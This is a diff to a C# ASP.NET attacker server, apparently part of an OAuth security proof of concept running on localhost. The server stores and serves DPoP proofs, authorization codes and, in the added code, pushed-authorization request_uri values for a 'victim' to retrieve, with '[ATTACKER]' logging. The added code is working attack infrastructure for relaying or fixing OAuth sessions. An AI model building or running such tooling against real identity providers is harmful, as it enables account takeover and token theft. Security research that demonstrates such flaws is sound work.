@@ -85,17 +85,46 @@ app.MapGet("/api/attack/status/{sessionId}", (string sessionId) =>
     return Results.Ok(status);
 });
 
+// PAR endpoints for request_uri attack
+app.MapPost("/api/attack/par", (PARData data) =>
+{
+    storage.StorePARData(data);
+    return Results.Ok(new { success = true, sessionId = data.SessionId });
+});
+
+app.MapGet("/api/attack/par/{sessionId}", (string sessionId) =>
+{
+    var parData = storage.GetPARData(sessionId);
+    if (parData != null)
+    {
+        return Results.Ok(parData);
+    }
+    return Results.NotFound();
+});
+
+app.MapGet("/api/attack/par/latest", () =>
+{
+    var latestPAR = storage.GetLatestPARData();
+    if (latestPAR != null)
+    {
+        return Results.Ok(latestPAR);
+    }
+    return Results.NotFound();
+});
+
 app.Run("https://localhost:7666");
 
 // Data models
 public record DPoPProofData(string SessionId, string DPoPProof, string DPoPHeader, string Nonce, string Url, string Method, string? CodeChallenge = null);
 public record AuthCodeData(string SessionId, string Code, string State, string? CodeVerifier, string IssuerUrl);
+public record PARData(string SessionId, string RequestUri);
 
 // Simple in-memory storage for the attack
 public class AttackStorage
 {
     private readonly ConcurrentDictionary<string, DPoPProofData> _dpopProofs = new();
     private readonly ConcurrentDictionary<string, AuthCodeData> _authCodes = new();
+    private readonly ConcurrentDictionary<string, PARData> _parData = new();
     private readonly ConcurrentDictionary<string, AttackStatus> _attackStatus = new();
 
     public void StoreDPoPProof(DPoPProofData data)
@@ -154,6 +183,29 @@ public class AttackStorage
     private void UpdateStatus(string sessionId, string status, string message)
     {
         _attackStatus[sessionId] = new AttackStatus(sessionId, status, message);
+    }
+
+    public void StorePARData(PARData data)
+    {
+        _parData[data.SessionId] = data;
+        UpdateStatus(data.SessionId, "par_stored", "PAR request_uri stored");
+        Console.WriteLine($"[ATTACKER] Stored PAR request_uri for session: {data.SessionId}");
+    }
+
+    public PARData? GetPARData(string sessionId)
+    {
+        _parData.TryGetValue(sessionId, out var data);
+        if (data != null)
+        {
+            UpdateStatus(sessionId, "par_retrieved", "PAR request_uri retrieved by victim");
+        }
+        return data;
+    }
+
+    public PARData? GetLatestPARData()
+    {
+        // Return the most recently added PAR data
+        return _parData.Values.OrderByDescending(p => p.SessionId).FirstOrDefault();
     }
 }
 
